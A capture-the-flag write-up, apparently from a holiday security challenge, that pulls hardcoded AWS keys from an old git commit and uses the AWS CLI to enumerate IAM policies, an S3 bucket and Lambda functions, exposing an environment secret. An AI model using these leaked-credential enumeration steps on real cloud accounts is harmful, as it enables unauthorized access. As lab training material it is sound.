
# Objective 13: Exploitation via AWS CLI
**Location: Cloud Ring / AWS201 Terminal**  
**Hints from Gerty Snowburrow (2x)**

This objective is to make use of the credentials found in objective 12 using the AWS CLI.

First we get hold of the identified file containing the credentials:
```
joergen@northpole:~$ git clone https://haugfactory.com/asnowball/aws_scripts.git
cloning into 'aws_scripts'...
remote: Enumerating objects: 64, done.
remote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64
Receiving objects: 100% (64/64), 23.85 KiB | 198.00 KiB/s, done.
Resolving deltas: 100% (32/32), done.
joergen@northpole:~$ cd aws_scripts/
joergen@northpole:~/aws_scripts$ git checkout 106d33e1ffd53eea753c1365eafc6588398279b5
Note: switching to '106d33e1ffd53eea753c1365eafc6588398279b5'.
[...]
HEAD is now at 106d33e added
joergen@northpole:~/aws_scripts$ cat put_policy.py 
import boto3
import json


iam = boto3.client('iam',
    region_name='us-east-1',
    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
    aws_secret_access_key="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",
)
# arn:aws:ec2:us-east-1:accountid:instance/*
response = iam.put_user_policy(
    PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["ssm:SendCommand"],"Resource":["arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5","arn:aws:ec2:us-east-1:748127089694:document/RestartServices"]}]}',
    PolicyName='AllAccessPolicy',
    UserName='nwt8_test',
)
```

So the credentials are:

aws_access_key_id: **AKIAAIDAYRANYAHGQOHD**
aws_secret_access_key: **e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL**

The following tasks are guided in a Cranberry Pi terminal:
```
elf@5486ce1f7db5:~$ aws configure
AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
elf@5486ce1f7db5:~$ aws sts get-caller-identity
{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}
elf@5486ce1f7db5:~$ aws iam list-attached-user-policies --user-name haug
{
    "AttachedPolicies": [
        {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
        }
    ],
    "IsTruncated": false
}
elf@5486ce1f7db5:~$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY
{
    "Policy": {
        "PolicyName": "TIER1_READONLY_POLICY",
        "PolicyId": "ANPAYYOROBUERT7TGKUHA",
        "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 11,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
        "CreateDate": "2022-06-21 22:02:30+00:00",
        "UpdateDate": "2022-06-21 22:10:29+00:00",
        "Tags": []
    }
}
elf@5486ce1f7db5:~$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:ListFunctions",
                        "lambda:GetFunctionUrlConfig"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUserPolicy",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::602123424321:user/${aws:username}"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
                },
                {
                    "Action": [
                        "iam:GetUserPolicy",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::602123424321:user/${aws:username}"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
                },
                {
                    "Effect": "Deny",
                    "Principal": "*",
                    "Action": [
                        "s3:GetObject",
                        "lambda:Invoke*"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-06-21 22:02:30+00:00"
    }
}
elf@5486ce1f7db5:~$ aws iam list-user-policies --user-name haug
{
    "PolicyNames": [
        "S3Perms"
    ],
    "IsTruncated": false
}
elf@5486ce1f7db5:~$ aws iam get-user-policy --user-name haug --policy-name S3Perms
{
    "UserPolicy": {
        "UserName": "haug",
        "PolicyName": "S3Perms",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:ListObjects"
                    ],
                    "Resource": [
                        "arn:aws:s3:::smogmachines3",
                        "arn:aws:s3:::smogmachines3/*"
                    ]
                }
            ]
        }
    },
    "IsTruncated": false
}
elf@5486ce1f7db5:~$ aws s3api list-objects --bucket smogmachines3
{
    "IsTruncated": false,
    "Marker": "",
    "Contents": [
        {
            "Key": "coal-fired-power-station.jpg",
            "LastModified": "2022-09-23 20:40:44+00:00",
            "ETag": "\"1c70c98bebaf3cff781a8fd3141c2945\"",
            "Size": 59312,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "industry-smog.png",
            "LastModified": "2022-09-23 20:40:47+00:00",
            "ETag": "\"c0abe5cb56b7a33d39e17f430755e615\"",
            "Size": 272528,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "pollution-smoke.jpg",
            "LastModified": "2022-09-23 20:40:43+00:00",
            "ETag": "\"465b675c70d73027e13ffaec1a38beec\"",
            "Size": 33064,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "pollution.jpg",
            "LastModified": "2022-09-23 20:40:45+00:00",
            "ETag": "\"d40d1db228c9a9b544b4c552df712478\"",
            "Size": 81775,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "power-station-smoke.jpg",
            "LastModified": "2022-09-23 20:40:48+00:00",
            "ETag": "\"2d7a8c8b8f5786103769e98afacf57de\"",
            "Size": 45264,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "smog-power-station.jpg",
            "LastModified": "2022-09-23 20:40:46+00:00",
                       "ETag": "\"0e69b8d53d97db0db9f7de8663e9ec09\"",
            "Size": 32498,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py",
            "LastModified": "2022-09-26 16:31:33+00:00",
            "ETag": "\"fd5d6ab630691dfe56a3fc2fcfb68763\"",
            "Size": 5823,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        }
    ],
    "Name": "smogmachines3",
    "Prefix": "",
    "MaxKeys": 1000,
    "EncodingType": "url"
}
elf@5486ce1f7db5:~$ aws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "smogmachine_lambda",
            "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambd
a",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::602123424321:role/smogmachine_lambda",
            "Handler": "handler.lambda_handler",
            "CodeSize": 2126,
            "Description": "",
            "Timeout": 600,
            "MemorySize": 256,
            "LastModified": "2022-09-07T19:28:23.634+0000",
            "CodeSha256": "GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=",
            "Version": "$LATEST",
            "VpcConfig": {
                "SubnetIds": [
                    "subnet-8c80a9cb8b3fa5505"
                ],
                "SecurityGroupIds": [
                    "sg-b51a01f5b4711c95c"
                ],
                "VpcId": "vpc-85ea8596648f35e00"
            },
            "Environment": {
                "Variables": {
                    "LAMBDASECRET": "975ceab170d61c75",
                    "LOCALMNTPOINT": "/mnt/smogmachine_files"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "7e198c3c-d4ea-48dd-9370-e5238e9ce06e",
            "FileSystemConfigs": [
                {
                    "Arn": "arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fs
ap-db3277b03c6e975d2",
                    "LocalMountPath": "/mnt/smogmachine_files"
                }
            ],
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            }
        }
    ]
}
elf@5486ce1f7db5:~$ aws lambda get-function-url-config --function-name smogmachine_lambda
{
    "FunctionUrl": "https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/",
    "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",
    "AuthType": "AWS_IAM",
    "Cors": {
        "AllowCredentials": false,
        "AllowHeaders": [],
        "AllowMethods": [
            "GET",
            "POST"
        ],
        "AllowOrigins": [
            "*"
        ],
        "ExposeHeaders": [],
        "MaxAge": 0
    },
    "CreationTime": "2022-09-07T19:28:23.808713Z",
    "LastModifiedTime": "2022-09-07T19:28:23.808713Z"
}
elf@5486ce1f7db5:~$


```

**Achievement: Exploitation via AWS CLI**
